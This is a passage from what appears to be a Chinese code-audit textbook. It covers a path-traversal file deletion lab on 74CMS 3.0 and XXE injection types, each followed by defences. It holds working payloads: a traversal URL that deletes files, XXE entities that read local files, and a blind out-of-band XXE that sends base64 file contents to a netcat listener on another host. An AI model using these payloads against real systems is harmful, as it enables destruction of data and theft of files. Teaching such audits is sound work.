\u53C2\u80038.4.1\u8282\uFF1A\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7B80\u4ECB\uFF1B8.4.2\u8282\uFF1A\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B74CMS V3.0\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BF974CMS\u5168\u5C40\u641C\u7D22\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570unlink\uFF0C\u5982\u56FE8-20\u6240\u793A\u3002\u5BA1\u8BA1\u51FD\u6570unlink\u7684\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u5177\u4F53\u7684\u8FC7\u6EE4\u60C5\u51B5\u3002\u672CCMS\u4E2Dadmin_article.php\u6587\u4EF6\u7684\u7B2C151\u884C\u5B58\u5728unlink\u51FD\u6570\u4F20\u53C2$img\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image456.jpg)\r
\r
\u56FE8-20 \u5168\u5C40\u641C\u7D22unlink\u56FE\r
\r
\u5F53\u4F20\u9012\u53C2\u6570$act\u4E3Adel_img\u65F6\uFF0C\u5176\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u7A0B\u5E8F\u5BF9\u4F20\u9012\u7684\u53C2\u6570id\u8FDB\u884Cintval\u51FD\u6570\u6574\u6570\u8FC7\u6EE4\u3002\r
\r
l SQL\u8BED\u53E5\u62FC\u63A5"update ".table('article')." set Small_img='' where id=".$id." LIMIT 1";\u66F4\u65B0\u6570\u636E\u5E93\u3002\r
\r
l \u4F7F\u7528unlink\u51FD\u6570\u5220\u9664\u6587\u4EF6\uFF08\u8DEF\u5F84\u4E3A\u201C$upfiles_dir/$img\u201D\uFF09\u3002\r
\r
l \u4F7F\u7528unlink\u51FD\u6570\u5220\u9664\u6587\u4EF6\uFF08\u8DEF\u5F84\u4E3A\u201C$thumb_dir.$img\u201D\uFF09\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
elseif($act == 'del_img')\r
 { //\u5BF9$_GET[\u2018id\u2019]\u8FDB\u884C\u6574\u6570\u8FC7\u6EE4\r
  $id=intval($_GET['id']);\r
  $img=$_GET['img'];\r
\r
//\u6570\u636E\u5E93\u66F4\u65B0\u8BED\u53E5\u62FC\u63A5\r
  $sql="update ".table('article')." set Small_img='' where id=".$id." LIMIT 1";\r
  $db->query($sql);\r
\r
//\u5220\u9664\u6587\u4EF6\r
  @unlink($upfiles_dir."/".$img);\r
  @unlink($thumb_dir.$img);\r
  adminmsg("\u5220\u9664\u7F29\u7565\u56FE\u6210\u529F\uFF01",2);\r
 }\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u5728\u5220\u9664\u56FE\u50CF$img\u524D\u5E76\u672A\u5BF9\u6587\u4EF6\u8FC7\u6EE4\uFF0C\u4F20\u9012\u6587\u4EF6\u540D\u79F0\u8FDB\u884C\u4E25\u683C\u7684\u8FC7\u6EE4\uFF0C\u8FD9\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528\u8BE5\u6F0F\u6D1E\u5220\u9664\u4EFB\u610F\u6587\u4EF6\u3002\r
\r
\uFF082\uFF09  \u786E\u5B9A\u8BE5\u529F\u80FD\u8BBF\u95EE\u6D41\u7A0B\r
\r
74CMS3.0\u4E2D\u89E6\u53D1\u201Cdel_img\u201D\u52A8\u4F5C\u7684\u524D\u53F0\u9875\u9762\u4E3Aadmin\\templates\\default\\article\\admin_article_edit.htm\u6587\u4EF6\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
\`\`\`\r
{#if $edit_article.Small_img#}\r
<a href="{#$thumb_dir#}{#$edit_article.Small_img#}" target="_blank" >\r
<img src="{#$thumb_dir#}{#$edit_article.Small_img#}" border="0" /> </a>\r
//\u4E0B\u9762\u8D85\u94FE\u63A5\u6807\u7B7E\u5C06\u4F20\u9012\u53C2\u6570act\u4E3Adel_img\uFF0Cid\u53C2\u6570\u548Cimg\u53C2\u6570\r
 <a href="?act=del_img&id={#$edit_article.id#}&img={#$edit_article.Small_img#}" style="color: #006600">\r
 [\u5220\u9664\u91CD\u65B0\u4E0A\u4F20] </a>\r
 {#else#}\r
<input type="file" name="Small_img"    onKeyDown="alert('\u8BF7\u70B9\u51FB\u53F3\u4FA7\u201C\u6D4F\u89C8\u201D\u9009\u62E9\u60A8\u7535\u8111\u4E0A\u7684\u56FE\u7247\uFF01');return false"   style="height:21px; width:210px; border:1px #999999 solid" />\r
{#/if#}\r
\`\`\`\r
\r
\r
\r
\`\`\`\r
\u4E0A\u8FF0\u4EE3\u7801\u4E2D\u52A0\u7C97\u90E8\u5206\u7684\u8D85\u94FE\u63A5\u6807\u7B7E\u89E6\u53D1\u7684\u8BF7\u6C42\u4E3A\u201C?act=del_img&id={#$edit_article.id#}&img={#$edit_article.Small_img#}\u201D\uFF0C\u8BE5\u8BF7\u6C42\u5C06\u89E6\u53D1admin_article.php\u6587\u4EF6\u4E2D\u7684\u5220\u9664\u6587\u4EF6\u6D41\u7A0B\uFF0C\u56FE8-21\u7ED9\u51FA\u8BE5\u6F0F\u6D1E\u7684\u8C03\u7528\u6D41\u7A0B\u3002\r
\r
\`\`\`\r
\r
\u56FE8-21 \u5220\u9664\u56FE\u7247\u6D41\u7A0B\r
\r
\uFF083\uFF09  \u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u5229\u7528\r
\r
\u4E3A\u6D4B\u8BD5\u8BE5CMS\u7684\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\uFF0C\u5728\u7F51\u7AD9\u6839\u8DEF\u5F84C:/PhpStudy/PHPTutorial/WWW\u76EE\u5F55\u4E0B\u521B\u5EFA\u4E00\u4E2A\u5B9E\u9A8C\u7528\u7684\u6D4B\u8BD5\u6587\u4EF61.txt\uFF0C\u7528\u4E8E\u540E\u7EED\u5220\u9664\u8BE5\u6587\u4EF6\u3002\r
\r
\u5728\u6D4F\u89C8\u5668\u4E2D\u8F93\u5165URL\u4E3Ahttp://[ip]/admin/admin_login.php\uFF0C\u767B\u5F55\u7F51\u7AD9\u7684\u7BA1\u7406\u7CFB\u7EDF\u3002\uFF08\u4E5F\u53EF\u4F7F\u7528\u8BE5\u7F51\u7AD9\u7684\u5BBD\u5B57\u8282\u6CE8\u5165\u767B\u5F55\u540E\u53F0\u7BA1\u7406\u7CFB\u7EDF\uFF09\u3002\u7136\u540E\u6D4B\u8BD5\u8BE5CMS\u7684\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\uFF0C\u5220\u9664\u4E0A\u6587\u521B\u5EFA\u8FC7\u76841.txt\u6587\u4EF6\uFF0C\u5728\u6D4F\u89C8\u5668\u4E2D\u8F93\u5165URL\u4E3Ahttp://[ip]/admin/admin_article.php?act=del_img&img=../../1.txt\u3002\u8BF7\u6C42\u6210\u529F\u540E\u7F51\u7AD9\u5C06\u5F39\u51FA\u5982\u754C\u97628-22\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image460.jpg)\r
\r
\u56FE8-22 \u5220\u9664\u56FE\u7247\u6210\u529F\u56FE\r
\r
## 8.5 \u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u867D\u7136\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u7684\u5171\u540C\u70B9\uFF0C\u5982\u88688-4\u6240\u793A\u3002\r
\r
\u88688-4 \u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5171\u540C\u70B9\r
\r
| **\u95EE\u9898\u63CF\u8FF0**                                     | **\u6587\u4EF6\u5C5E\u6027**                 |\r
| ------------------------------------------------ | ---------------------------- |\r
| \u5BF9\u76EE\u5F55\u6587\u4EF6\u6743\u9650\u8BBE\u7F6E\u5B58\u5728\u95EE\u9898\u9020\u6210\u8D8A\u6743               | \u7CFB\u7EDF\u6587\u4EF6\u76EE\u5F55\u5747\u5177\u6709\u6700\u9AD8\u6743\u9650   |\r
| \u5141\u8BB8\u4F7F\u7528\u201C../\u201D\u3001\u201C./\u201D\u3001\u201C..\\\u201D\u7B49\u65B9\u5F0F\u9020\u6210\u76EE\u5F55\u7A7F\u8D8A\u6F0F\u6D1E | http://ip?filename=../../xxx |\r
| \u5BF9HTTP\u8BF7\u6C42\u7684\u53C2\u6570\u672A\u8FC7\u6EE4\u6216\u8FC7\u6EE4\u4E0D\u4E25\u5BFC\u81F4\u64CD\u4F5C\u4EFB\u610F\u6587\u4EF6 | http://ip?filename=xxx       |\r
\r
\u9488\u5BF9\u4E0A\u8FF0\u6F0F\u6D1E\u5171\u540C\u70B9\uFF0C\u7ED9\u51FA\u5982\u4E0B\u7684\u9632\u5FA1\u65B9\u6CD5\uFF1A\r
\r
l \u767D\u540D\u5355\r
\r
\u5BF9\u7528\u6237\u4E0A\u4F20\u7684\u6587\u4EF6\u7C7B\u578B\u8FDB\u884C\u6821\u9A8C\uFF0C\u5EFA\u8BAE\u4F7F\u7528\u767D\u540D\u5355\u6821\u9A8C\u673A\u5236\u8FC7\u6EE4\u6587\u4EF6\u6269\u5C55\u540D\u3002\r
\r
l \u5BF9\u6587\u4EF6\u6743\u9650\u7684\u5408\u7406\u7BA1\u7406\r
\r
\u5BF9\u4E8E\u672A\u6388\u6743\u7684\u7528\u6237\u5728\u672A\u6388\u6743\u7684\u60C5\u51B5\u4E0B\u7981\u6B62\u67E5\u770B\u3001\u5220\u9664\u3001\u6267\u884C\u6587\u4EF6\u7B49\u64CD\u4F5C\u3002\r
\r
l \u4E25\u683C\u63A7\u5236\u6587\u4EF6\u540D\u53C2\u6570\u4F20\u9012\r
\r
\u907F\u514D\u4F7F\u7528\u4F20\u9012\u6587\u4EF6\u540D\u7684\u65B9\u5F0F\u3002\u53EF\u901A\u8FC7\u5C06\u6587\u4EF6\u540D\u3001\u6587\u4EF6\u8DEF\u5F84\u3001\u6587\u4EF6md5\u7684ID\u53F7\u3001\u5F53\u524D\u64CD\u4F5C\u7528\u6237\u7B49\u4FE1\u606F\u5B58\u50A8\u5230\u6570\u636E\u5E93\u4E2D\uFF0C\u7136\u540E\u901A\u8FC7\u4F20\u9012\u6587\u4EF6ID\u548C\u5F53\u524D\u64CD\u4F5C\u7528\u6237\u7684\u65B9\u5F0F\u5224\u65AD\u6587\u4EF6\u662F\u5426\u5B58\u5728\u53CA\u7528\u6237\u662F\u5426\u6709\u6743\u9650\u4E0B\u8F7D\u8BE5\u6587\u4EF6\u3002\r
\r
\u5BF9\u4E8E\u5DF2\u77E5\u6587\u4EF6\u540D\u79F0\u7684\u6587\u4EF6\u64CD\u4F5C\u529F\u80FD\u70B9\uFF0C\u4F7F\u7528\u540E\u53F0\u4EE3\u7801\u76F4\u63A5\u6307\u5B9A\u64CD\u4F5C\u6587\u4EF6\u540D\uFF0C\u4E0D\u4F7F\u7528\u53C2\u6570\u4F20\u9012\u7684\u65B9\u5F0F\u4F20\u9012\u6587\u4EF6\u540D\u79F0\u3002\r
\r
l \u7981\u6B62\u76EE\u5F55\u8DF3\u8F6C\r
\r
\u5BF9\u4E8E\u6587\u4EF6\u7F16\u8F91\u64CD\u4F5C\u529F\u80FD\uFF0C\u82E5\u9700\u8981\u4F20\u5165\u6587\u4EF6\u8DEF\u5F84\uFF0C\u5219\u53EF\u901A\u8FC7\u540E\u53F0\u4EE3\u7801\u56FA\u5B9A\u5F85\u64CD\u4F5C\u7684\u6587\u4EF6\u76EE\u5F55\uFF0C\u540C\u65F6\u7981\u6B62HTTP\u8BF7\u6C42\u4F20\u9012\u7684\u53C2\u6570\u8DEF\u5F84\u4E2D\u5E26\u6709\u201C..\u201D\u3001\u201C/\u201D\u3001\u201C\\\u201D\u7684\u5B57\u7B26\u3002\r
\r
l \u4F7F\u7528\u968F\u673A\u6570\u6539\u5199\u6587\u4EF6\u540D\u548C\u6587\u4EF6\u8DEF\u5F84\r
\r
\u5E94\u7528\u968F\u673A\u6570\u6539\u5199\u6587\u4EF6\u540D\u548C\u8DEF\u5F84\uFF0C\u589E\u52A0\u653B\u51FB\u8FD9\u64CD\u4F5C\u6587\u4EF6\u7684\u96BE\u5EA6\u3002\u4F8B\u5982\uFF1A\u91C7\u7528\u65F6\u95F4\u6233\u62FC\u63A5\u968F\u673A\u6570\u7684MD5\u503C\u65B9\u5F0F\u201Cmd5(time()+rand(1,10000))\u201D\u3002\r
\r
## 8.6 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\uFF0C\u5206\u522B\u5305\u62EC\uFF1A\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3001\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u3001\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u3001\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u3002\u901A\u8FC7\u5BF9\u5E38\u89C1\u6F0F\u6D1E\u51FD\u6570\u8FDB\u884C\u5217\u4E3E\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5E38\u89C1\u7684\u5BA1\u8BA1\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u7684\u65B9\u6CD5\uFF0C\u4E0B\u56FE8-26\u4E3A\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u603B\u7ED3\u56FE\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u51439 XXE\u4E0ESSRF\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2DXXE\u6F0F\u6D1E\u3001SSRF\u6F0F\u6D1E\u5B89\u5168\u95EE\u9898\u7684\u5BA1\u8BA1\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u4E09\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECDXXE\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1AXXE\u6F0F\u6D1E\u7684\u57FA\u672C\u6982\u5FF5\u3001XXE\u6F0F\u6D1E\u5BA1\u8BA1\u65B9\u6CD5\u3001XXE\u6F0F\u6D1E\u9632\u5FA1\u65B9\u6CD5\u7B49\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECBXXE\u6F0F\u6D1E\u7684\u5206\u7C7B\uFF0C\u5305\u62EC\uFF1A\u901A\u8FC7DTD\u5916\u90E8\u5B9E\u4F53\u58F0\u660E\u3001\u901A\u7528\u5B9E\u4F53\u3001\u53C2\u6570\u5B9E\u4F53\uFF0C\u5E76\u4F7F\u7528CLTPHP5.5.3\u8FDB\u884CXXE\u6F0F\u6D1E\u5BA1\u8BA1\u5B9E\u8DF5\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECDSSRF\u6F0F\u6D1E\u7684\u57FA\u672C\u77E5\u8BC6\u5E76\u4F7F\u7528APPCMS2.0\u8FDB\u884CSSRF\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u5B9E\u8DF5\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image462.jpg)**\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u4E86\u89E3XXE\u4E0ESSRF\u6F0F\u6D1E\u7684\u539F\u7406\u3001\u6316\u6398\u6280\u5DE7\uFF1B\r
\r
\\2.  \u638C\u63E1XXE\u4E0ESSRF\u6F0F\u6D1E\u7684\u5E38\u89C1\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\3.  \u638C\u63E1XXE\u4E0ESSRF\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\uFF1B\r
\r
## 9.1 XXE\u6F0F\u6D1E\u6316\u6398\r
\r
### 9.1.1 XXE\u6F0F\u6D1E\u7B80\u4ECB\r
\r
XXE\uFF08XML External Entity\uFF09\u6F0F\u6D1E\u540D\u4E3AXML\u5916\u90E8\u5B9E\u4F53\u6CE8\u5165\u3002\u8BE5\u6F0F\u6D1E\u6210\u56E0\u662F\u5E94\u7528\u7A0B\u5E8F\u5728\u89E3\u6790XML\u65F6\u6CA1\u6709\u8FC7\u6EE4\u5916\u90E8\u5B9E\u4F53\uFF08\u5916\u90E8\u5B9E\u4F53\u5305\u62EC\u4E00\u822C\u5B9E\u4F53\u548C\u5916\u90E8\u53C2\u6570\u5B9E\u4F53\uFF09\u7684\u52A0\u8F7D\uFF0C\u5BFC\u81F4\u52A0\u8F7D\u4E86\u6076\u610F\u7684\u5916\u90E8\u6587\u4EF6\uFF0C\u9020\u6210\u6267\u884C\u547D\u4EE4\u3001\u8BFB\u53D6\u6587\u4EF6\u3001\u626B\u63CF\u5185\u7F51\u3001\u653B\u51FB\u5185\u7F51\u7B49\u5371\u5BB3\u3002\r
\r
### 9.1.2 XXE\u6F0F\u6D1E\u6316\u6398\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u6316\u6398XXE\u6F0F\u6D1E\u65B9\u6CD5\u76F8\u5BF9\u5355\u4E00\uFF0C\u7531\u4E8EXXE\u6F0F\u6D1E\u9700\u8981\u5BF9XML\u6587\u4EF6\u8FDB\u884C\u89E3\u6790\uFF0C\u56E0\u6B64\u53EF\u4EE5\u5BF9PHP\u4EE3\u7801\u8FDB\u884C\u5168\u5C40\u641C\u7D22\u89E3\u6790XML\u6587\u4EF6\u7684\u51FD\u6570\uFF0C\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u5206\u6790\u53C2\u6570\u662F\u5426\u53EF\u63A7\u5E76\u7ED5\u8FC7\u8FC7\u6EE4\u5373\u53EF\u3002\r
\r
XXE\u6F0F\u6D1E\u7684\u654F\u611F\u51FD\u6570\u5305\u62EC\uFF1A\r
\r
l simplexml_load_string()\uFF1A\u8F6C\u6362\u5F62\u5F0F\u826F\u597D\u7684XML\u5B57\u7B26\u4E32\u4E3ASimpleXMLElement\u5BF9\u8C61\u3002\r
\r
l simplexml_load_file()\uFF1A\u51FD\u6570\u628AXML\u6587\u6863\u8F7D\u5165\u5BF9\u8C61\u4E2D\u3002\r
\r
l simplexml_import_dom()\uFF1A\u51FD\u6570\u628A DOM \u8282\u70B9\u8F6C\u6362\u4E3A SimpleXMLElement \u5BF9\u8C61\u3002\r
\r
## 9.2 XXE\u6F0F\u6D1E\u5206\u7C7B\r
\r
\u6839\u636E\u4F7F\u7528\u7684XXE Payload\u4E0D\u540C\uFF0C\u4E00\u822C\u5C06XXE\u6F0F\u6D1E\u5206\u4E3A\uFF1A\u76F4\u63A5\u58F0\u660E\u5B9E\u4F53\u3001\u5F15\u7528\u5916\u90E8DTD\uFF08\u901A\u7528\u5B9E\u4F53\uFF09\u3001\u5F15\u7528\u5916\u90E8DTD\uFF08\u53C2\u6570\u5B9E\u4F53\uFF09\u3001\u65E0\u56DE\u663EXXE\uFF0C\u672C\u5C0F\u8282\u5C06\u5BF9\u5E38\u89C1\u7684XXE\u6F0F\u6D1E\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u5BA1\u8BA1\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
libxml_disable_entity_loader (false);//\u5173\u95ED\u7981\u6B62\u5916\u90E8\u5B9E\u4F53\u5F15\u7528\u529F\u80FD\r
\r
$xmlfile = file_get_contents('php://input');//\u4ECEHTTP\u7684POST\u8BF7\u6C42\u63A5\u6536\u6570\u636E\r
\r
$dom = new DOMDocument(); //\u521B\u5EFADOM\u5BF9\u8C61\r
\r
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//\u6839\u636Exmlfile\u8F6C\u6362\u4E3ADOM\u8282\u70B9\r
\r
$creds = **simplexml_import_dom**($dom);// \u51FD\u6570\u628A DOM \u8282\u70B9\u8F6C\u6362\u4E3A SimpleXMLElement \u5BF9\u8C61\r
\r
echo $creds;\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u901A\u8FC7php://input\u83B7\u53D6\u7F51\u7AD9\u7684\u8F93\u5165\u6D41\u5E76\u5C06\u5176\u8D4B\u503C\u4E3A$xmlfile\u3002\r
\r
l \u7136\u540E\u5C06$xmlfile\u8F6C\u6362\u4E3ADOM\u8282\u70B9\u3002\r
\r
l DOM\u8282\u70B9\u8F6C\u6362\u4E3ASimpleXMLElement \u5BF9\u8C61\u5E76\u6253\u5370\u3002\r
\r
l \u7531\u4E8E\u7A0B\u5E8F\u672A\u5BF9\u7528\u6237\u8F93\u5165\u8FDB\u884C\u8FC7\u6EE4\u5C31\u5C06\u5176\u8F6C\u6362\u4E3Axml\u5BF9\u8C61\uFF0C\u56E0\u6B64\u5B58\u5728XXE\u6F0F\u6D1E\u3002\r
\r
\u4E0B\u9762\u5BF9XXE\u7684\u4E09\u79CD\u6CE8\u5165\u65B9\u5F0F\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
  \uFF081\uFF09\u76F4\u63A5\u901A\u8FC7DTD\u5916\u90E8\u5B9E\u4F53\u58F0\u660E\r
\r
  \u5728XML\u6587\u4EF6\u7684DTD\u4E2D\u76F4\u63A5\u6307\u5B9A\u5143\u7D20\u4E3A\u5B9E\u4F53b\uFF0C\u5B9A\u4E49\u503C\u4E3A\u8BFB\u53D6c:/1.txt\u6587\u4EF6\u5185\u5BB9\uFF0C\u5176xml\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?xml version="1.0"?>\r
\r
<!DOCTYPE a [**<!ENTITY b SYSTEM "file:///c:/flag.txt" >**]>\r
\r
<x>&b;</x>\r
\r
\r
\r
  \uFF082\uFF09\u5F15\u7528\u5916\u90E8DTD\uFF08\u901A\u7528\u5B9E\u4F53\uFF09\r
\r
  \u8BE5\u65B9\u5F0F\u4E3A\u4F7F\u7528\u901A\u7528\u5B9E\u4F53\u5F15\u7528\u8BFB\u53D6\u6587\u4EF6\u6216\u8BBF\u95EE\u7F51\u7EDC\uFF0C\u8FD9\u662F\u6BD4\u8F83\u7B80\u5355\u7684\u4E00\u79CDXXE\u6CE8\u5165\u65B9\u5F0F\u3002\u5728XML\u7684DTD\u5B9A\u4E49\u5F15\u7528\u5916\u90E8\u7684DTD\u6587\u4EF6\uFF0C\u4F7F\u7528\u201C&\u5B9E\u4F53\u540D;\u201D\u7684\u5F62\u5F0F\u5F15\u7528\u5B9E\u4F53\uFF0C\u5176xml\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?xml version="1.0"?>\r
\r
<!DOCTYPE a [\r
\r
\u200B    <!ENTITY **b** SYSTEM "**http://127.0.0.1/evil.dtd**">\r
\r
]>\r
\r
<a>&b;</a>\r
\r
\\#\u800Chttp://127.0.0.1/evil.dtd\u5185\u5BB9\u4E3A\r
\r
**<!ENTITY b SYSTEM " file:///c:/ flag.txt ">**\r
\r
\r
\r
  \uFF083\uFF09\u5F15\u7528\u5916\u90E8DTD\uFF08\u53C2\u6570\u5B9E\u4F53\uFF09\r
\r
\u8BE5\u65B9\u5F0F\u4E3A\u4F7F\u7528\u53C2\u6570\u8BFB\u53D6\u6587\u4EF6\u6216\u8BBF\u95EE\u7F51\u7EDC\uFF0C\u8BE5\u65B9\u5F0F\u548C\u901A\u7528\u5B9E\u4F53\u4E00\u6837\uFF0C\u53C2\u6570\u5B9E\u4F53\u53EF\u4EE5\u5916\u90E8\u5F15\u7528\u3002\u540C\u65F6\uFF0C\u4F7F\u7528\u201C% \u5B9E\u4F53\u540D;\u201D\uFF08%\u4E0E\u5B9E\u4F53\u540D\u4E2D\u95F4\u6709\u7A7A\u683C\uFF09\u7684\u5F62\u5F0F\u5728DTD\u4E2D\u5B9A\u4E49\uFF0C\u5E76\u4E14\u53EA\u6709\u5728DTD\u4E2D\u4F7F\u7528\u201C%\u5B9E\u4F53\u540D;\u201D\u5F15\u7528\u3002\u53EA\u6709\u5728DTD\u6587\u4EF6\u4E2D\uFF0C\u53C2\u6570\u5B9E\u4F53\u7684\u58F0\u660E\u624D\u80FD\u5F15\u7528\u5176\u4ED6\u5B9E\u4F53\u3002\r
\r
\r
\r
<?xml version="1.0"?>\r
\r
<!DOCTYPE a [\r
\r
<!ENTITY **% b** SYSTEM "http://127.0.0.1/evil.dtd">\r
\r
   **%b;**\r
\r
]>\r
\r
<a>%b;</a>\r
\r
\\#http:// 127.0.0.1/evil.dtd\u6587\u4EF6\u5185\u5BB9\r
\r
**<!ENTITY b SYSTEM " file:///c:/ flag.txt ">**\r
\r
\r
\r
\uFF084\uFF09\u65E0\u56DE\u663EXXE\u8BFB\u53D6\u6587\u4EF6\r
\r
\u5728\u5F88\u591A\u60C5\u51B5\u4E0B\uFF0CPHP\u4EE3\u7801\u5E76\u4E0D\u4F1A\u5C06XML\u5F15\u7528\u7684\u5916\u90E8\u53C2\u6570\u503C\u6253\u5370\u503C\u524D\u53F0\u9875\u9762\u4E2D\uFF0C\u4E00\u822C\u79F0\u4E3A\u201C\u65E0\u56DE\u663E\u8BFB\u53D6\u672C\u5730\u654F\u611F\u6587\u4EF6\uFF08Blind OOB XXE\uFF09\u201D\u3002\u8FD9\u5C31\u9700\u8981\u501F\u52A9\u4E8Enetcat\u5DE5\u5177\u5E76\u5F00\u542F\u7AEF\u53E3\u8282\u540E\u63A5\u6536\u8BF7\u6C42\u6570\u636E\uFF0C\u540C\u65F6\u5F15\u7528\u5916\u90E8DTD\u5E76\u63A7\u5236\u8BE5DTD\u5411\u5916\u53D1\u9001HTTP\u8BF7\u6C42\u5C06\u5185\u5BB9\u53D1\u9001\u4E3B\u81F3netcat\u5F00\u542F\u7684\u7AEF\u53E3\uFF0C\u4ECE\u800C\u663E\u793A\u5185\u5BB9\u3002\r
\r
\r
\r
<?xml version="1.0"?>\r
\r
<!DOCTYPE convert [\r
\r
<!ENTITY **% remote** SYSTEM "http://127.0.0.1/evil.dtd">\r
\r
   **%remote;%int;%send;**\r
\r
]>\r
\r
\\#http:// 127.0.0.1/evil.dtd\u6587\u4EF6\u5185\u5BB9\u5982\u4E0B\uFF0C\u4E14192.168.0.7\u7684\u4E3B\u673A\u5F00\u542F9999\u7AEF\u53E3\r
\r
<!ENTITY **% file** SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt">\r
\r
<!ENTITY **% int** "<!ENTITY &#37;send SYSTEM 'http://192.168.0.7:9999?p=%file;'>">\r
\r
\r
\r
## 9.3 XXE\u6F0F\u6D1E\u9632\u5FA1\r
\r
XXE\u6F0F\u6D1E\u9632\u5FA1\u7684\u4E3B\u8981\u95EE\u9898\u5728\u4E8EPHP\u4EE3\u7801\u5BF9XML\u8FDB\u884C\u4E86\u89E3\u6790\uFF0C\u540C\u65F6XML\u53EF\u5F15\u7528\u5916\u90E8DTD\u6587\u4EF6\u5BFC\u81F4\u7684\uFF0C\u4E0B\u9762\u7ED9\u51FAXXE\u6F0F\u6D1E\u9632\u5FA1\u5EFA\u8BAE\uFF1A\r
\r
\uFF081\uFF09\u4F7F\u7528\u5F00\u53D1\u8BED\u8A00\u63D0\u4F9B\u7684\u7981\u7528\u5916\u90E8\u5B9E\u4F53\u7684\u65B9\u6CD5\u3002\u5BF9\u4E8EPHP\u800C\u8A00\uFF0C\u4F7F\u7528\u65B9\u6CD5\u4E3A\uFF1Alibxml_disable_entity_loader(true);\u3002\r
\r
\uFF082\uFF09\u8FC7\u6EE4\u7528\u6237\u63D0\u4EA4\u7684XML\u5173\u952E\u5B57\u3002\u5E38\u89C1\u7684\u5173\u952E\u5B57\u5305\u62EC\uFF1A<!DocTYPE\u3001<!ENTITY\u3001SYSTEM\u3001PUBLIC\u7B49\u3002\r
\r
\uFF083\uFF09\u68C0\u67E5\u7F51\u7AD9\u7684XML\u6587\u4EF6\uFF0C\u4E0D\u5141\u8BB8XML\u6587\u4EF6\u4E2D\u542B\u6709\u81EA\u5DF1\u5B9A\u4E49\u7684DTD\u3002\r
\r
## 9.4 XXE\u5BA1\u8BA1CMS\u5B9E\u8DF5\r
\r
### 9.4.1  \u5B9E\u9A8C\uFF1ACLTPHP5.5.3 XXE\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
